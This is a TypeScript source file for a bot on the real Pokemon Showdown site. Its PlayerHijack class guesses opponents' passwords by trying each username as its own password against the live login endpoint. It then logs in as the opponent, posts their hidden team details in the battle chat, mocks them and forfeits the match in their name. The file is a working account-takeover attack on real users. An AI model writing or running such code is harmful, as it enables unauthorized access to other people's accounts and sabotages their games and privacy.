import fs = require('fs');
import * as request from 'request-promise-native';
import { logger } from './logger';
import { LoginForm, Player } from './Player'
import { Champ } from './Champ';
import { PSConnection } from './PSConnection';
import { BattleData } from './BattleData';

let settings   = JSON.parse(fs.readFileSync('settings.json').toString());
let snooze = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

let checkpass = async (user: string, pass: string) => {
	let fakechal = '4|034a2f187c98af6da8790273cb5314157d922e1c932aeb6538f5b4c3acdb88809ffdb03f053014e7795a8725d27de1ebdd782ff612484918d0aa43caeab7c66586c83b95f456ccb996b6a94e9aeaa66f18773d401915da8f3899d2715d1dae309ff49c6ff9306ad4ae109be871efd078b69bf19a1b7cccff14976282996668a6';
	let data : LoginForm = new LoginForm;
	data.challstr = fakechal;
	data.act = 'login';
	data.name = user;
	data.pass = pass;
	let body = await request.post('http://play.pokemonshowdown.com/action.php', {
					 form: data
	});
	if (body[0] != ']')
		return false;
	body = body.substr(1);
	body = JSON.parse(body);
	if (body.assertion[0] == ';') {
		return false;
	}
	return true;
}

export class PlayerHijack {
    opponent: Champ;
    account?: Player;
	room: string;
    constructor(battleData : BattleData, battlers : Map<String, Champ>) {
		let alias = battleData.champ_alias![1] == '1' ? 'p2' : 'p1';
		this.room = battleData.roomid;
		this.opponent = battlers.get(alias)!;
	}

	async tryJack(isRegged: boolean) {
		try {
			if (isRegged) {
				let passwords = [this.opponent.showdown_name];
				for (let pass of passwords) {
					if (await checkpass(this.opponent.showdown_name, pass)) {
						this.account = new Player(this.opponent.showdown_name, pass);
						break;
					} else {
						console.log(pass + ' did not work');
					}
				}
			} else {
				logger.log(0, 'unregged account ${this.opponent.showdown_name}');
				this.account = new Player(this.opponent.showdown_name);
			}
			if (!this.account)
				return;
			//this.bot = new Player(settings.showdown.user, settings.showdown.pass);
			await this.account.connect();
			this.account.tryJoin(this.room);
			logger.log(0, 'connected as ${this.opponent.showdown_name}');
			this.account.message(this.room, 'Hi, my name is J.A.C.K., brought to you by D*gars©');
			let myteam = await this.account.getMyTeam(this.room)!;
			for (let mon of myteam!) {
				let desc = [mon.details, mon.condition, mon.item, mon.baseAbility,
							Object.keys(mon.stats).map(k => k + ': ' + mon.stats[k]).join(' / '),
							mon.moves.join(', ')].join(' ');
				this.account.message(this.room, desc);
				await snooze(1500);
			}
			this.account.message(this.room, 'PERFECTLY HEALTHY');
			await snooze(1000);
			this.account.message(this.room, '/forfeit');
			await snooze(1000);
			this.account.disconnect();
		} catch(e) {
			console.log('Could not hijack the opponent:');
			console.log(e);
		}
	}
}
